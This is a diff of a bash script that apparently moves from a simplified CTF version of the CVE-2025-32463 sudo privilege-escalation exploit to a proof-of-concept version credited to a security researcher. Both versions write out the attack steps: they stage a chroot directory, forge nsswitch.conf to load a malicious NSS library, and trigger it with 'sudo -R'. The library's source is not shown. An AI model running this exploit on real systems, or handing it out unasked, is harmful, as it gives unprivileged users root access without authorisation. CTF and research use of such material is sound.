@@ -1,23 +1,17 @@
 #!/bin/bash
-# Simplified sudo exploit for CTF - CVE-2025-32463
-# Uses pre-compiled library to run: cat /flag3
+# sudo-chwoot.sh
+# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
+#                  @ Stratascale Cyber Research Unit (CRU)
+STAGE=$(mktemp -d /tmp/woot)
+cd ${STAGE?} || exit 1
 
-STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX)
-cd "${STAGE}" || exit 1
+# Section Removed
 
-# Copy pre-compiled library
-cp /tmp/woot1337.so.2 ./
-
-# Create necessary directory structure
-mkdir -p woot/etc
+mkdir -p woot/etc libnss_
 echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc
+cp /tmp/woot.so.2 libnss_/woot1337.so.2
 
-# Copy group file to avoid errors
-cp /etc/group woot/etc/ 2>/dev/null || echo "root:x:0:" > woot/etc/group
-
-echo "[+] Exploit setup complete, triggering sudo..."
+echo "woot!"
 sudo -R woot woot
-
-# Cleanup
-cd /
-rm -rf "${STAGE}"
+rm -rf ${STAGE?}
